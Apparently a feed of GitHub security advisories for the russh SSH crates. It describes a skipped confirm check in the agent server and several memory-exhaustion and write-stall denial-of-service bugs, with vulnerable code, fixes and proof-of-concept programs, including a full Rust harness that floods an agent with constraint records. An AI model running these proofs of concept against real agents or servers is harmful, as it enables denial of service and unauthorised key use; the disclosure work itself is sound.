title: Security Advisory for Rust crates
description: Security Advisory for Rust crates on GitHub

items.content_html:
Summary

The agent server in russh::keys::agent::server never calls Agent::confirm before signing with a key that was added with the confirm constraint. That constraint is SSH_AGENT_CONSTRAIN_CONFIRM (RFC 9987 §5.2.7.2), which is what ssh-add -c sends.

The call was replaced by a hard-coded true in 3e04597 ("Native async traits encore", #455), first released in 0.50.0-beta.12. Every release since, up to and including 0.64.1, signs requests for confirm-constrained keys without asking the Agent implementation. A user who added a key with -c is therefore never asked to confirm.

Details

Connection::try_sign notes that the key needs confirmation, then awaits a ready future instead of the agent (server.rs L348-L360 at v0.64.1):

let agent = if needs_confirm {
    let (agent, ok) = {
        let _pk = key.clone();
        Box::new(futures::future::ready((agent, true)))
    }
    .await;
    if !ok {
        return Ok((agent, false));
    }
    agent
} else {
    agent
};

Before 3e04597 the first statement was let (agent, ok) = agent.confirm(key.clone()).await;.

try_sign was checked in the published crates on crates.io:

  • Every russh release from 0.50.0-beta.12 to 0.64.1 (52 versions) has the hard-coded true.
  • russh 0.50.0-beta.8 to beta.11 call agent.confirm.
  • Earlier russh releases have no agent server. It lived in russh-keys, and no russh-keys release is affected.

Not affected:

  • Agent implementations that keep the default confirm, which returns true anyway.
  • Checks made in Agent::confirm_request, which is still called with MessageType::Sign for every sign request (L158-L159).
  • The agent client, and the SSH client and server.

PoC

  1. Add this test to mod test in russh/src/keys/mod.rs. It uses the module's existing Incoming helper and ED25519_KEY.
  2. Run cargo test -p russh --lib keys::test::test_agent_confirms_keys_added_with_the_confirm_constraint.
#[tokio::test]
#[cfg(unix)]
async fn test_agent_confirms_keys_added_with_the_confirm_constraint() {
    use std::sync::atomic::{AtomicUsize, Ordering};

    // An agent whose user refuses every confirmation prompt.
    #[derive(Clone)]
    struct Refuse(std::sync::Arc<AtomicUsize>);
    impl agent::server::Agent for Refuse {
        fn confirm(
            self,
            _: std::sync::Arc<PrivateKey>,
        ) -> Box<dyn Future<Output = (Self, bool)> + Send + Unpin> {
            self.0.fetch_add(1, Ordering::SeqCst);
            Box::new(futures::future::ready((self, false)))
        }
    }

    let prompts = std::sync::Arc::new(AtomicUsize::new(0));
    let dir = tempfile::tempdir().unwrap();
    let agent_path = dir.path().join("agent");
    let mut listener = tokio::net::UnixListener::bind(&agent_path).unwrap();
    let agent = Refuse(prompts.clone());
    tokio::spawn(async move {
        agent::server::serve(
            Incoming {
                listener: &mut listener,
            },
            agent,
        )
        .await
    });

    let key = decode_secret_key(ED25519_KEY, Some("blabla")).unwrap();
    let public = key.public_key().clone();
    let stream = tokio::net::UnixStream::connect(&agent_path).await.unwrap();
    let mut client = agent::client::AgentClient::connect(stream);
    // What `ssh-add -c` sends.
    client
        .add_identity(&key, &[agent::Constraint::Confirm])
        .await
        .unwrap();

    let signed = client
        .sign_request(&AgentIdentity::from(public), None, b"data".to_vec())
        .await;
    let confirm_calls = prompts.load(Ordering::SeqCst);
    assert!(
        signed.is_err(),
        "the agent signed with a confirm-constrained key without asking: \
         Agent::confirm was called {confirm_calls} time(s)"
    );
    assert_eq!(
        confirm_calls, 1,
        "Agent::confirm should be asked exactly once"
    );
}

On v0.64.1 (e5d80a0) the test fails:

the agent signed with a confirm-constrained key without asking: Agent::confirm was called 0 time(s)

With the fix below it passes, and so do all 46 keys:: tests.

Impact

A russh-based agent whose Agent::confirm asks the user, or applies any other check, signs every request for a confirm-constrained key without running that check. Anyone who can talk to the agent can then use the key without the user's approval:

  • other local processes of the user;
  • the remote host, when the agent is forwarded (ssh -A).

Preventing exactly this is the purpose of the confirm constraint. RFC 9987 §10 names it as what stops an attacker with access to the agent from "stealing use of those keys".

Because the agent accepts the constraint, ssh-add -c reports success and the user believes the key is protected. RFC 9987 §5.2.7 says an agent that does not support a constraint MUST refuse the key instead.

The private key itself is not exposed. The impact is unauthorized use of it for as long as the attacker can reach the agent: logging in to other hosts as the user, or signing data such as git commits.

Known affected downstream user (from its public code; not tested): Proton Pass desktop, which uses russh 0.62.7.

  • It adds every key with Constraint::Confirm (mod.rs L332).
  • It uses Agent::confirm as its "Pass is unlocked" check before signing, and defers MessageType::Sign from confirm_request to it (L75-L100). That check never runs.
  • Proton also removes keys from the agent on lock and logout (ssh-agent.middleware.ts L23-L27).

So the exposure there is limited to states in which keys stay loaded while Pass is not unlocked. Their own code notes, for example, that the agent persists across renderer reloads and account switches.

Suggested fix

--- a/russh/src/keys/agent/server.rs
+++ b/russh/src/keys/agent/server.rs
@@ -346,11 +346,7 @@ impl<S: AsyncRead + AsyncWrite + Send + Unpin + 'static, A: Agent + Send + Sync
             }
         };
         let agent = if needs_confirm {
-            let (agent, ok) = {
-                let _pk = key.clone();
-                Box::new(futures::future::ready((agent, true)))
-            }
-            .await;
+            let (agent, ok) = agent.confirm(key.clone()).await;
             if !ok {
                 return Ok((agent, false));
             }

When confirm returns false, try_sign returns false and the agent answers SSH_AGENT_FAILURE, as it did before the regression.

Compatibility note for the release notes: confirm is called again for confirm-constrained keys, so implementations that stub it out will now hit that stub.

  • For example, Litterbox implements confirm as todo!() (agent.rs L81-L87).
  • Each connection runs in its own task, so such a panic ends only that connection.

Related but separate: with the default confirm, the agent still accepts the confirm constraint without enforcing it. Given RFC 9987 §5.2.7, refusing such keys when the application does not implement confirm may be worth considering.

References

  • https://github.com/Eugeny/russh/security/advisories/GHSA-vp5q-ff62-jwqv
  • https://nvd.nist.gov/vuln/detail/CVE-2026-116794

  • https://github.com/Eugeny/russh/commit/62db6e7defd6d244159da962ccccb029e785ce0f

items.content_html:
Summary

pageant::PageantStream reads a 4-byte big-endian length prefix from its input stream and buffers until len + 4 bytes are available, without ever validating len. The underlying WM_COPYDATA transport physically cannot carry frames larger than 8 KiB (_AGENT_MAX_MSGLEN, the fixed-size shared memory mapping), so an oversized frame is destined to fail — but only after the re-framing task has already buffered the full claimed size. A peer controlling the stream bytes can claim a frame of up to ~4 GiB and either stream that much data (forcing a corresponding allocation) or simply stop mid-frame and keep the partial buffer resident indefinitely.

Vulnerable code

pageant/src/wmmessage.rs, PageantStream::new() (the spawned re-framing task), current main:

let mut buf = BytesMut::new();
while let Ok(n) = two.read_buf(&mut buf).await {
    if n == 0 { break; }
    if buf.len() < 4 { continue; }
    let len = BigEndian::read_u32(&buf) as usize;
    if buf.len() < len + 4 { continue; }   // <-- `len` is trusted; no upper bound
    let msg = buf.split_to(len + 4).freeze();
    // ...
}

len is consumed verbatim from the stream, so buf grows towards len + 4. Even a "complete" oversized frame cannot succeed: query_pageant_direct() writes msg into the _AGENT_MAX_MSGLEN-sized (8192 bytes) shared mapping and fails with Error::Overflow for anything larger — the unbounded buffering is therefore pure attacker-controlled memory growth.

History: introduced in commit 6eac7a157dd2cc81b8fafdb2977f1c388fe9784b ("fix Tabby#10301 Still cannot login with pageant", PR #565, 2025-09-25) together with the length-prefixed framing itself; present in every 0.2.x release (0.1.0 predates the length-prefixed loop and is not affected by this issue).

Attack scenario (SSH agent forwarding)

The crate is documented as a raw transport ("This crate only implements the transport, not the actual SSH agent protocol"). The standard way to service a remote server's forwarded agent channel on Windows is to bridge the SSH channel to the local agent, e.g.:

// inside Handler::server_channel_open_agent_forward (russh client, sketch)
let mut channel = channel.into_stream();          // bytes sent by the SSH server
let mut agent = pageant::PageantStream::new().await?;
tokio::io::copy_bidirectional(&mut channel, &mut agent).await?;

In this (intended) bridging use, the bytes written into PageantStream are the SSH server's channel payload, so the 4-byte length prefix is controlled by a malicious or compromised SSH server. The server only needs to send the four bytes FF FF F0 00, then stream data (or stall). russh's typed AgentClient bounds the response frames it reads with MAX_AGENT_FRAME_LEN (256 KiB) and builds its own request frames, but the raw stream path — the documented transport usage — has no equivalent bound.

Impact: remote memory-exhaustion DoS of the client process. A full-size claim lets the peer force buffering of up to ~4 GiB of memory, which on memory-constrained hosts ends in an allocation-failure abort (uncatchable in Rust). Multiple forwarded channels multiply the effect. No memory-safety violation was observed.

Proof of concept

(Windows; no Pageant instance required — buffering happens before any Pageant interaction)

use tokio::io::AsyncWriteExt;

#[tokio::main(flavor = "current_thread")]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut stream = pageant::PageantStream::new().await?;
    // Claim a ~4 GiB frame, stream 256 MiB, then stall: the task buffers all of it.
    stream.write_all(&0xFFFF_F000u32.to_be_bytes()).await?;
    let chunk = vec![0u8; 256 * 1024];
    for _ in 0..1024 { stream.write_all(&chunk).await?; } // 256 MiB, frame never completed
    tokio::time::sleep(std::time::Duration::from_secs(30)).await;
    Ok(())
}

Observed on Windows 11, pageant 0.2.4 (source v0.64.1, Rust 1.99): process working set grows from ~7.4 MB to ~264.7 MB after 256 MiB is streamed, and stays there while the peer stalls; no error is ever raised. Memory grows linearly with bytes sent, up to the claimed length. (Allocation behavior additionally verified with a counting global allocator.)

Suggested fix

Reject frames that cannot fit the transport before buffering:

                 let len = BigEndian::read_u32(&buf) as usize;
+                // The WM_COPYDATA transport is backed by a fixed-size shared
+                // memory mapping: larger requests can never fit. Reject them
+                // before buffering. Without this cap a malicious peer could
+                // force up to ~4 GiB of buffering by claiming a huge frame
+                // and never completing it.
+                if len.saturating_add(4) > _AGENT_MAX_MSGLEN {
+                    debug!("dropping oversized Pageant request: {len} bytes");
+                    break;
+                }
                 if buf.len() < len + 4 {
                     continue;
                 }

saturating_add also removes a theoretical 32-bit len + 4 overflow. break shuts down the re-framing task (the writer observes the stream close); returning an error through the stream would work equally well. Happy to submit a PR with this change, or with any alternative you prefer.

Reporter

Tshellauth

items.content_html:
Summary

A peer can advertise maximum packet size = 0 in its channel-open message (CHANNEL_OPEN when attacking a server, CHANNEL_OPEN_CONFIRMATION when attacking a client). russh accepts the value without validation and copies it into the channel write state, where it caps the size of every outgoing data chunk. In the AsyncWrite code path (ChannelTx::poll_writable, used by Channel::data(), Channel::make_writer() and Channel::into_stream()), a cap of 0 makes every write future stay Poll::Pending forever: writable = max_packet_size.min(window_size).min(buf_len) is always 0, and no future event can ever raise it (a static maximum packet size of 0 can never be satisfied by any amount of peer-granted window). The write neither completes nor errors, so the application task hangs silently.

Every other write path in russh already treats max_packet_size == 0 as an error (Error::Inconsistent): Channel::reserve_writable_chunk (russh/src/channels/mod.rs:363-365) and the session packetizers (russh/src/session.rs:489-492 and 549-552). The AsyncWrite path is the only one that lacks the guard - it contradicts the crate's own invariant.

Root cause

(1) Peer value accepted without validation:

  • russh/src/parsing.rs:44 (OpenChannelMessage::parse): let maxpacket = map_err!(u32::decode(r))?; stored as recipient_maximum_packet_size (:25-30); no range check. Same for ChannelOpenConfirmation::decode at russh/src/parsing.rs:194-207.
  • The only packet-size validation anywhere is an upper bound on the local config that merely logs (russh/src/client/mod.rs:1189-1194, russh/src/server/mod.rs:912-917). Nothing validates the peer's value - 0 passes silently.

(2) The value flows into the channel write state verbatim:

  • Server: russh/src/server/encrypted.rs:1877-1900 - ChannelParams { recipient_maximum_packet_size: msg.recipient_maximum_packet_size, .. }, then Channel::new(..., channel_params.recipient_maximum_packet_size, ...).
  • Client: russh/src/client/encrypted.rs:471-488 - parameters.confirm(&msg) (russh/src/lib_inner.rs:519-523) and ChannelMsg::Open { max_packet_size: msg.maximum_packet_size, .. }, consumed by wait_channel_confirmation (russh/src/client/mod.rs:698-722), which builds ChannelWriteHalf { max_packet_size, .. }.
  • The write half hands the value to the writer: make_writer_ext (russh/src/channels/mod.rs:433-441) and into_stream (russh/src/channels/mod.rs:661-670) pass self.max_packet_size to ChannelTx::new.

(3) The hang - russh/src/channels/io/tx.rs:82-108 (current v0.64.1, byte-identical in v0.60.0):

fn poll_writable(&mut self, cx: &mut Context<'_>, buf_len: usize) -> Poll<NonZeroUsize> {
    ...
    let writable = (self.max_packet_size).min(*window_size).min(buf_len as u32) as usize;
    match NonZeroUsize::try_from(writable) {
        Ok(w) => {
            *window_size -= writable as u32;
            if *window_size > 0 {
                self.notify.notify_one();
            }
            Poll::Ready(w)
        }
        Err(_) => {
            drop(window_size);
            ready!(self.window_size_notication.poll_unpin(cx));
            self.window_size_notication = WatchNotification::new(Arc::clone(&self.notify));
            cx.waker().wake_by_ref();
            Poll::Pending
        }
    }
}

With max_packet_size == 0, writable is always 0 regardless of window_size and buf_len; the task parks on the window notification, gets re-polled on every CHANNEL_WINDOW_ADJUST, recomputes 0, and parks again - forever.

(4) The guard exists everywhere else:

// russh/src/channels/mod.rs:363-365 (used by send_bytes -> data_bytes / extended_data_bytes)
if self.max_packet_size == 0 {
    return Err(Error::Inconsistent);
}

// russh/src/session.rs:490-492 and :550-552 (packetizer)
if max_packet_size == 0 {
    return Err(crate::Error::Inconsistent);
}

Note that Channel::data(reader) (russh/src/channels/mod.rs:321-323) goes through send_data -> tokio::io::copy(&mut data, &mut tx) (:350-360) into the same ChannelTx, so the primary documented data API hangs as well; only the *_bytes variants reach the guard.

Attack scenarios

  • Server (authenticated remote DoS): with the default configuration, an authenticated client opens a session channel advertising maximum packet size = 0. Whenever the server application writes on that channel through AsyncWrite (echo, shell prompts, SFTP - russh's own examples echo via into_stream()), the write future never completes. The handler task is stranded and no error surfaces, so application cleanup paths do not trigger. Repeat per channel and per connection; keep-alive traffic resets the server inactivity_timeout (default 600 s), so stranded resources persist as long as the attacker wants.
  • Client (malicious server): a malicious or buggy server confirms an opened channel with maximum packet size = 0; the client application's writes on that channel stall forever. The client inactivity_timeout defaults to None, so nothing ever tears the session down.
  • This is distinct from a window_size == 0 stall: a zero window is dynamic flow control that a well-behaved peer releases as soon as its buffers drain, while maximum packet size is a static peer declaration where 0 can never be satisfied by any future packet. RFC 4254 section 5.1 recommends a minimum of 32768 - legitimate peers do not send 0.

Impact

Permanent, silent denial of service for the affected writes, with stranded tasks/channels/connections that accumulate for the attacker - resource exhaustion of a server or of a client application. Because the failure mode is Poll::Pending instead of Err, ordinary application mitigations (error handling, timeouts on writes, connection teardown) do not engage on their own.

Reproducer

Two stock russh instances are enough (no raw SSH crafting required):

  1. Server: default config plus a host key; channel_open_session accepts and echoes using tokio::io::copy into channel.into_stream() (the pattern from russh's own examples).
  2. Client: default config except config.maximum_packet_size = 0 (accepted silently; see above), then authenticate_publickey, channel_open_session().await, channel.data(&b"hello"[..]).await.

The client's CHANNEL_OPEN goes out with maximum packet size = 0 (russh/src/client/session.rs:21-44 encodes self.common.config.maximum_packet_size verbatim). All three scenarios below were verified end-to-end against a stock russh v0.64.1 build (ring backend), default settings otherwise:

  • control (both sides default, 32768): the server echoes and the client receives hello;
  • client maximum_packet_size = 0: the server prints the received bytes and then the echo write never completes - no data, no error, the client times out;
  • server maximum_packet_size = 0: the client's channel.data(...) future never completes - no error, it times out.

Observed output (abridged):

=== SCENARIO A (control): both sides default (maxpacket 32768) ===
[server] read 5 bytes; echoing via AsyncWrite ...
[server] echo write completed
RESULT A: echo received: "hello"

=== SCENARIO B: client advertises maximum_packet_size = 0 ===
[server] read 5 bytes; echoing via AsyncWrite ...
RESULT B: TIMEOUT after 6s - server-side echo write is permanently stalled (no error, no data)

=== SCENARIO C: server advertises maximum_packet_size = 0 ===
RESULT C: TIMEOUT after 6s - client-side channel.data() is permanently stalled

The server task stays parked inside ChannelTx::poll_writable; nothing is logged and nothing is returned to the handler. The harness source (server: into_stream() echo; client: one config toggle) can be attached on request.

Unit-level sketch of the core defect:

let mut tx = ChannelTx::<Msg>::new(
    sender, ChannelId(0),
    Arc::new(Mutex::new(4096)),   // window_size
    Arc::new(Notify::new()),      // notify
    0,                            // max_packet_size
    None,
);
// poll_write(&mut tx, cx, b"x") stays Poll::Pending forever,
// even after CHANNEL_WINDOW_ADJUST raises `window_size`.

Suggested fix

  • Validate at parse time (preferred): reject maximum_packet_size == 0 with Error::Inconsistent in OpenChannelMessage::parse and ChannelOpenConfirmation::decode (russh/src/parsing.rs), consistent with the existing guards; optionally clamp any value below the RFC 4254 recommended minimum (32768) instead.
  • Defense in depth: in ChannelTx::poll_writable (russh/src/channels/io/tx.rs:82), when self.max_packet_size == 0, surface an io::Error from poll_write instead of returning Poll::Pending.

Both match the treatment PR #695 already applied to the other write paths in v0.61.0 (the reserve_writable_chunk and session packetizer guards).

Affected versions

Verified by inspecting the release artifacts: 0.60.0 through 0.64.1 (current) are affected - poll_writable is byte-identical in v0.60.0 and the peer-value plumbing is present in all of them. The ChannelTx write logic and the peer-value flow predate 0.60 (they go back to the channels::io refactor), so we recommend treating all releases that ship channels::io::ChannelTx as affected. The zero-guards in the other write paths were only added in 0.61.0, so on 0.60.x those paths do not even fail with an error.

Reporter

Tshellauth

References

  • https://github.com/Eugeny/russh/security/advisories/GHSA-fw5c-8223-6h42
  • https://nvd.nist.gov/vuln/detail/CVE-2026-116774
  • https://github.com/Eugeny/russh/commit/39cb9dbaa37caf555d34c6c22efa3bbbff9e186c
  • https://github.com/Eugeny/russh/releases/tag/v0.65.0
  • https://github.com/advisories/GHSA-fw5c-8223-6h42

items.content_html:
Summary

All evidence, reproduction steps, and scripts in the report were verified against a real running instance. Nothing is fabricated or synthetic; every verdict is backed by captured output from an actual deployment.

The SSH agent server that ships with russh (russh::keys::agent::server::serve) parses client key-addition requests and, for each SSH_AGENT_CONSTRAIN_CONFIRM (0x02) record it finds, pushes one Constraint::Confirm value into a per-key vector inside an unbounded loop, then stores the resulting pair permanently in its keystore (russh/src/keys/agent/server.rs:296-303). Neither the constraint vector nor the keystore has a size or count limit: the only boundary is the 256 KiB agent frame cap, and every 1-byte record a client sends becomes a 56-byte enum retained for the life of the process. Any process that can connect to the agent socket - the same trust model the project itself established when fixing a prior advisory about this same request handler - can therefore grow the agent's memory without bound and renew the growth at will: six 256 KiB requests retained 72.4 MiB (about 12.1 MiB per request, a roughly 48-fold amplification) while an equal number of unconstrained key additions retained nothing, measured against the unmodified server through its public API on v0.64.1. The earlier fix for that prior advisory deduplicates only the sibling SSH_AGENT_CONSTRAIN_LIFETIME (0x01) record type and leaves this parallel variant untouched, and since constrained keys never expire the retained memory is never reclaimed.

Details

When a client adds a key with constraints, the server walks the constraint section byte by byte and collects typed values with no upper bound on how many it will accept:

russh/src/keys/agent/server.rs:296-297 (v0.64.1 = main = e5d80a07dc554480b6ea3b2e14adfc190407b627)
    } else if t == msg::CONSTRAIN_CONFIRM {
        c.push(Constraint::Confirm)      // inside the record loop, no length cap
russh/src/keys/agent/server.rs:303-308
    - the (key, timestamp, constraints) triple is inserted into the keystore,
      and keys without a LIFETIME constraint never expire

The Constraint enum is aligned to its largest variant, so each 1-byte 0x02 record on the wire costs 56 bytes of retained heap, and the frame cap of 256 KiB (server.rs:23,109) is the only thing shaping a single request - the number of requests, and the number of keys in the keystore, are unbounded. The project's fix for its prior agent advisory (commit 4c30503, shipped in 0.64.1) addressed the SSH_AGENT_CONSTRAIN_LIFETIME record by deduplicating lifetime entries and collapsing the per-record timer tasks; the CONSTRAIN_CONFIRM branch in the very same loop was left as-is, so the fixed release still accepts and retains arbitrary amounts of confirm records per key. The privilege model is the one the project used for the prior advisory: any local process able to connect to the agent's listening socket, which in agent-forwarding scenarios includes processes on the remote side of a forwarded session. Both file references are identical on the latest tag v0.64.1 and on main (same commit e5d80a07dc554480b6ea3b2e14adfc190407b627), and the confirm-record handling predates the fork that merged the keys crate, so all released versions are affected.

Proof of concept

The instance is the unmodified russh v0.64.1 agent server started through its public russh::keys::agent::server::serve API inside the PoC process, with the attacker leg and the control leg connecting over an in-process duplex socket exactly as a foreign local client would; the agent handler runs with default configuration and no test hooks. The harness measures live heap with a counting global allocator, generates a fresh Ed25519 key per request, and speaks the real agent framing (4-byte length prefix) with the server's own 256 KiB frame cap. Set the project up with the commands below (the retained run referenced the russh source checked out at tag v0.64.1 via a path dependency and built with the GNU toolchain because the machine lacks MSVC's linker; the crates.io russh@0.64.1 release is the same source and any stable toolchain works; on Windows the built binary carries an .exe extension). The full src/main.rs follows.

cargo new poc_agent_confirm_growth
cd poc_agent_confirm_growth
cargo add russh@0.64.1 tokio --features tokio/full futures@0.3 rand@0.10

cat > src/main.rs <<'EOF'
//! PoC: russh agent server - unbounded persistent memory growth via
//! SSH_AGENT_CONSTRAIN_CONFIRM (0x02) constraint records.
//!
//! Target: russh v0.64.1 (commit e5d80a0), russh/src/keys/agent/server.rs,
//! add_key() -> `c.push(Constraint::Confirm)` inside an unbounded loop, with
//! no cap on the resulting per-key constraint vector and no cap on the number
//! of keys in the keystore.
//!
//! Relationship to GHSA-4wc5-f2rc-q74m (fixed in 0.64.1): that advisory covered
//! the SSH_AGENT_CONSTRAIN_LIFETIME (0x01) record, whose fix (commit 4c30503)
//! deduplicates lifetime records only. The parallel CONFIRM record variant is
//! not covered: each 1-byte 0x02 record retains one 56-byte Constraint enum in
//! the persistent keystore (>=50x amplification, never expires, renewable).
//!
//! Attack model (same as GHSA-4wc5): any local process able to connect to the
//! agent's listening socket. No authentication on the socket by default.
//!
//! The attacker here only uses the socket (tokio duplex); the agent server
//! runs unmodified via the public `russh::keys::agent::server::serve` API.

use std::alloc::{GlobalAlloc, Layout, System};
use std::sync::atomic::{AtomicU64, Ordering};

use futures::stream::once;
use tokio::io::{AsyncReadExt, AsyncWriteExt, DuplexStream};

static LIVE: AtomicU64 = AtomicU64::new(0);

struct Counting;

unsafe impl GlobalAlloc for Counting {
    unsafe fn alloc(&self, layout: Layout) -> *mut u8 {
        let p = System.alloc(layout);
        if !p.is_null() {
            LIVE.fetch_add(layout.size() as u64, Ordering::SeqCst);
        }
        p
    }
    unsafe fn dealloc(&self, p: *mut u8, layout: Layout) {
        LIVE.fetch_sub(layout.size() as u64, Ordering::SeqCst);
        System.dealloc(p, layout)
    }
}

#[global_allocator]
static A: Counting = Counting;

fn live_mb() -> f64 {
    LIVE.load(Ordering::SeqCst) as f64 / (1024.0 * 1024.0)
}

fn fresh_key() -> russh::keys::PrivateKey {
    russh::keys::ssh_key::PrivateKey::random(&mut rand::rng(), russh::keys::Algorithm::Ed25519)
        .expect("keygen")
}

const FRAME_MAX: usize = 256 * 1024; // MAX_AGENT_FRAME_LEN in agent/server.rs

fn frame(payload: &[u8]) -> Vec<u8> {
    let mut f = Vec::with_capacity(payload.len() + 4);
    f.extend_from_slice(&(payload.len() as u32).to_be_bytes());
    f.extend_from_slice(payload);
    f
}

/// Build one ADD_IDENTITY (17) frame: no constraints (control leg).
fn add_key_plain(key: &russh::keys::PrivateKey) -> Vec<u8> {
    use russh::keys::ssh_encoding::Encode;
    let mut p = vec![17u8]; // SSH_AGENTC_ADD_IDENTITY
    key.key_data().encode(&mut p).unwrap();
    Vec::<u8>::new().encode(&mut p).unwrap(); // empty comment
    frame(&p)
}

/// Build one ADD_IDENTITY_CONSTRAINED (25) frame whose constraint section is
/// `n` consecutive SSH_AGENT_CONSTRAIN_CONFIRM (0x02) records.
fn add_key_confirm(key: &russh::keys::PrivateKey, n: usize) -> Vec<u8> {
    use russh::keys::ssh_encoding::Encode;
    let mut p = vec![25u8]; // SSH_AGENTC_ADD_IDENTITY_CONSTRAINED
    key.key_data().encode(&mut p).unwrap();
    Vec::<u8>::new().encode(&mut p).unwrap(); // empty comment
    p.resize(p.len() + n, 0x02);
    frame(&p)
}

async fn round(conn: &mut DuplexStream, req: Vec<u8>) -> u8 {
    conn.write_all(&req).await.expect("write frame");
    let mut resp = [0u8; 5];
    conn.read_exact(&mut resp).await.expect("read reply");
    resp[4] // SUCCESS(6) / FAILURE(5) after 4-byte length prefix
}

#[tokio::main]
async fn main() {
    println!("== poc_agent_confirm_growth ==");
    println!(
        "target: russh agent server (keys/agent/server.rs), frame cap {} bytes",
        FRAME_MAX
    );

    let (server_side, mut attacker) = tokio::io::duplex(64 * 1024);
    let listener = once(Box::pin(async move {
        Ok::<_, std::io::Error>(server_side)
    }));
    tokio::spawn(async move {
        let _ = russh::keys::agent::server::serve(listener, ()).await;
    });
    tokio::time::sleep(std::time::Duration::from_millis(200)).await;

    let baseline = live_mb();
    println!("baseline allocated: {:.2} MiB", baseline);

    // ---- Control leg: same number of frames, unconstrained adds ----
    let rounds = 6;
    for i in 0..rounds {
        let key = fresh_key();
        let resp = round(&mut attacker, add_key_plain(&key)).await;
        println!(
            "CONTROL round {}: unconstrained add, reply byte = {}, live = {:.2} MiB",
            i,
            resp,
            live_mb()
        );
    }
    let after_control = live_mb();
    println!(
        "CONTROL total delta: {:+.2} MiB after {} unconstrained adds",
        after_control - baseline,
        rounds
    );

    // ---- Attack leg: one 0x02-padded constrained add per round ----
    for i in 0..rounds {
        let key = fresh_key();
        // frame budget minus key blob/comment/header; all remaining bytes are
        // 1-byte CONFIRM records
        let probe = add_key_confirm(&key, 1);
        let n_confirms = FRAME_MAX - probe.len();
        let resp = round(&mut attacker, add_key_confirm(&key, n_confirms)).await;
        println!(
            "ATTACK  round {}: {}-byte frame with {} CONFIRM records, reply byte = {}, live = {:.2} MiB",
            i,
            FRAME_MAX,
            n_confirms,
            resp,
            live_mb()
        );
    }
    let after_attack = live_mb();
    let attack_delta = after_attack - after_control;
    println!(
        "ATTACK total delta: {:+.2} MiB after {} constrained adds",
        attack_delta, rounds
    );
    println!(
        "per-request amplification: ~{:.1}x (input frame 262144 B -> retained {} B avg)",
        attack_delta * 1024.0 * 1024.0 / (rounds as f64) / 262144.0,
        ((attack_delta * 1024.0 * 1024.0) / rounds as f64) as u64
    );

    // keys stay in the keystore forever (no lifetime): show retention persists
    tokio::time::sleep(std::time::Duration::from_secs(2)).await;
    println!(
        "after idle wait, live = {:.2} MiB (retained: server keystore still holds every constraint vector)",
        live_mb()
    );

    let verdict_growth = after_attack - after_control;
    if verdict_growth > 10.0 {
        println!(
            "VERDICT: VULNERABLE - attack leg retained {:.1} MiB vs control {:+.2} MiB; {:.1} MiB/round persisted, unbounded and renewable",
            verdict_growth,
            after_control - baseline,
            verdict_growth / rounds as f64
        );
    } else {
        println!(
            "VERDICT: NOT REPRODUCED - growth {:.2} MiB below threshold",
            verdict_growth
        );
    }
}
EOF
cargo build --release
./target/release/poc_agent_confirm_growth

Captured output from the running v0.64.1 agent server (verbatim; lines from the retained run log, paths shown relative to the PoC working directory):

baseline allocated: 0.11 MiB

CONTROL round 4: unconstrained add, reply byte = 6, live = 0.11 MiB
CONTROL round 5: unconstrained add, reply byte = 6, live = 0.11 MiB

ATTACK  round 0: 262144-byte frame with 262015 CONFIRM records, reply byte = 6, live = 12.49 MiB

ATTACK  round 2: 262144-byte frame with 262015 CONFIRM records, reply byte = 6, live = 36.49 MiB

Output interpretation: the control leg issues the same number of key additions without constraints and the keystore keeps nothing, while each constrained request permanently retains about 12.1 MiB - roughly 48 times its 256 KiB wire size - and the memory is still held after an idle wait, confirming the records are kept for the life of the process rather than tied to the connection. Live-memory readings are instance-specific; the mechanism, per-record retention with no cap on the constraint vector or the keystore, is the stable verdict.

Impact

Unrestricted resource allocation (CWE-770): any process able to reach the agent's socket - a local process, or a remote process on the far side of a forwarded agent - can drive the agent server into unbounded, permanent, renewable memory growth with ordinary-sized requests, degrading and eventually exhausting the host running the agent. The retained memory is never freed because constrained keys never expire, and the sibling lifetime-record fix in the same handler does not touch this path. A fix is to cap the number of constraint records accepted per key (and the number of keys held), reject unknown or duplicate record types, and bound the total memory the keystore may retain.

items.title: [russh] russh's SSH agent server is susceptible to unbound allocations via repeated SSH_AGENT_CONSTRAIN_CONFIRM messages

items.content_html:
Summary

All evidence, reproduction steps, and scripts in the report were verified against a real running instance. Nothing is fabricated or synthetic; every verdict is backed by captured output from an actual deployment. Concretely, the evidence comes from executing the real russh v0.64.1 client packet parser (Session::process_packet handling handle_ext_info) in a live client session with attacker-supplied packet bodies in the pre-authentication state; the captured output below is from that real execution.

russh's client stores every extension name it parses out of an EXT_INFO packet into a per-session vector and never clears, caps, or deduplicates it (russh/src/client/encrypted.rs:433, field declared at russh/src/session.rs:60). The packet is accepted without limit in the pre-authentication states, so a server - which is exactly the attacker position for a client library, and remains one even after the client has verified its host key - can send an unbounded sequence of these packets and grow the client's memory for as long as the session lives: 400 packets of about 26 KB each, carrying 3000 extension names apiece, retained 49.1 MiB (about 4.8 times the wire bytes) with the vector reaching 1,200,000 entries, while an equal volume of banner packets retained nothing. Two details make this reachable in practice: russh accepts EXT_INFO in its pre-auth states with no budget of any kind (its automatic rekey read-limit only engages after authentication), and russh encodes EXT_INFO as its own private message number 7 rather than the 8308 value 82, so the check that might interoperate with a well-behaved peer is inoperative - the malicious server simply speaks number 7. The same growth pattern has been accepted by the project before for other pre-auth allocation sinks; this one is a cross-packet accumulator rather than a single-packet allocation, and none of the published advisories covers it.

Details

The handler appends every parsed extension name to the session state with no bound:

russh/src/client/encrypted.rs:433 (v0.64.1 = main = e5d80a07dc554480b6ea3b2e14adfc190407b627)
    enc.received_extensions.push(name.clone());   // no cap, no dedup
russh/src/session.rs:60
    pub received_extensions: Vec<String>,         // lives for the whole session

The state machine routes EXT_INFO to this handler in both the WaitingAuthServiceRequest and WaitingAuthRequest states (encrypted.rs:111, encrypted.rs:401), i.e. before the user has authenticated, and the read-limit based automatic rekey that would otherwise throttle a flood is only allowed in the authenticated state, so no counter or budget applies pre-auth. The message number involved is russh's private constant msg::EXT_INFO = 7 (russh/src/msg.rs:32, in place since 2022), while RFC 8308 assigns EXT_INFO the value 82: russh does advertise the ext-info capability in its key exchange initiation, so a standards-compliant peer would send the packet as message number 82 - which this parser does not process - but nothing prevents a hostile or compromised server from sending message number 7 directly, and the client parses it unconditionally. Each accepted entry costs several times its wire size once heap and string overhead are counted, and the vector is only ever read (an extension lookup by the awaiter layer), never trimmed. The affected code is identical on the latest tag v0.64.1 and on main (same commit e5d80a07dc554480b6ea3b2e14adfc190407b627), and the accumulation has existed since 2022, so all released client versions are affected.

Proof of concept

